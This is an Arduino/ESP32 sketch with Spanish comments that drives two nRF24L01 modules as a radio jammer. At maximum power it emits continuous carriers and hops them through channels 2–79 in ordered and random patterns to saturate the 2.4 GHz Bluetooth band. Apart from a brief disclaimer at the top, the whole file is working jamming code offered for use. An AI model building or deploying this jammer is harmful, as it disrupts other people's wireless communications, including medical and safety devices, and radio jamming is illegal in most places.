/*
ADVERTENCIA: Código para uso en entornos controlados únicamente, jamás en hospitales o lugares críticos;
su uso es bajo su propio riesgo, y se prohíbe donde pueda poner en peligro vidas o violar leyes.
*/
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Definición de dos radios nRF24L01
// radio  -> conectado a pines HSPI
// radio1 -> conectado a pines VSPI
RF24 radio(26, 15, 16000000);   // CE=26, CSN=15, frecuencia SPI=16 MHz (HSPI)
RF24 radio1(4, 2, 16000000);    // CE=4,  CSN=2,  frecuencia SPI=16 MHz (VSPI)

// Rango de canales que se usarán (2 a 79 para cubrir la banda Bluetooth)
const int BT_CHANNEL_START = 2;   // Canal mínimo
const int BT_CHANNEL_END   = 79;  // Canal máximo

// Variables de control para los saltos de frecuencia
unsigned int flag  = 0;   // Control de dirección para 'ch'
unsigned int flagv = 0;   // Control de dirección para 'ch1'
int ch  = 45;             // Canal inicial para radio (HSPI)
int ch1 = 45;             // Canal inicial para radio1 (VSPI)

void setup() {
  Serial.begin(115200);

  // Desactivar las radios internas del ESP32 (WiFi y Bluetooth)
  esp_bt_controller_deinit(); 
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();
  
  // Inicializar los módulos nRF24L01 en buses diferentes
  initHP();  // HSPI
  initSP();  // VSPI

  Serial.println("Sistema listo. Comenzando interrupción...");
}

// Función para inicializar el nRF24L01 en bus HSPI
void initHP() {
  SPIClass *hp = new SPIClass(HSPI);
  hp->begin();  // Inicia el bus HSPI
  if (radio.begin(hp)) {
    Serial.println("HSPI Jammer Iniciado");
    configureRadio(radio, ch);
  } else {
    Serial.println("Error al iniciar HSPI");
  }
}

// Función para inicializar el nRF24L01 en bus VSPI
void initSP() {
  SPIClass *sp = new SPIClass(VSPI);
  sp->begin();  // Inicia el bus VSPI
  if (radio1.begin(sp)) {
    Serial.println("VSPI Jammer Iniciado");
    configureRadio(radio1, ch1);
  } else {
    Serial.println("Error al iniciar VSPI");
  }
}

// Configuración de parámetros de transmisión para cada módulo nRF24
void configureRadio(RF24 &radio, int channel) {
  radio.setAutoAck(false);               // Sin auto-ack
  radio.stopListening();                 // No recibe, solo transmite
  radio.setRetries(0, 0);                // Sin reintentos
  radio.setPALevel(RF24_PA_MAX, true);   // Máxima potencia (con low-noise amplifier si existe)
  radio.setDataRate(RF24_2MBPS);         // Tasa de 2 Mbps
  radio.setCRCLength(RF24_CRC_DISABLED); // Sin CRC
  // startConstCarrier: emite una portadora continua en el canal especificado
  radio.startConstCarrier(RF24_PA_MAX, channel);
}

// Función que realiza saltos "ordenados" incrementando o decrementando los canales
void two() {
  // Ajuste de ch1 (usa pasos de +/-4)
  if (flagv == 0) {
    ch1 += 4;
  } else {
    ch1 -= 4;
  }

  // Ajuste de ch (usa pasos de +/-2)
  if (flag == 0) {
    ch += 2;
  } else {
    ch -= 2;
  }

  // Cambiar la dirección de salto si llegamos a los límites [2..79]
  if ((ch1 > BT_CHANNEL_END) && (flagv == 0)) {
    flagv = 1;
  } else if ((ch1 < BT_CHANNEL_START) && (flagv == 1)) {
    flagv = 0;
  }

  if ((ch > BT_CHANNEL_END) && (flag == 0)) {
    flag = 1;
  } else if ((ch < BT_CHANNEL_START) && (flag == 1)) {
    flag = 0;
  }

  // Asignar los nuevos canales
  radio.setChannel(ch);
  radio1.setChannel(ch1);
}

// Función que selecciona canales aleatoriamente para cada módulo
void one() {
  radio1.setChannel(random(80));  // random(80) => [0..79]
  radio.setChannel(random(80));
  delayMicroseconds(random(60));  // Pequeño retardo aleatorio
}

// Bucle principal
void loop() {
  // Se combinan dos estrategias: un salto pseudo-ordenado (two())
  // y un salto aleatorio (one()), en cada ciclo
  two();
  one();
}